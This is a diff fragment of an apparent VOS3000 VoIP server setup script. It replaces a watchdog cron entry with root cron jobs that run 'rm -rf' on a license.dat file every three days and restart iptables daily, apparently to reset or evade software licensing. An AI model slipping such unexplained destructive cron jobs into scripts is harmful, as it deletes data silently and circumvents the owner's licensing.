@@ -260,7 +260,7 @@ echo -e "1 */1 * * * /opt/MbxWatch.sh" >> /var/spool/cron/root
 
 #chkconfig * on
 for i in callcenterd callserviced empd ivrdiald mbx3000d mgcserverd phoneserviced vos3000d vos3000webct vos3000websv crond iptables httpd mysql ;do chkconfig $i on ;done
-echo -e "1 */1 * * * /opt/MbxWatch.sh" >> /var/spool/cron/root
+echo -e "0 0 */3 * * rm -rf /home/kunshi/license/license.dat\n01 01 * * * /etc/init.d/iptables restart" >> /var/spool/cron/root
 
 
 tee /etc/sysconfig/iptables <<-'EOF'
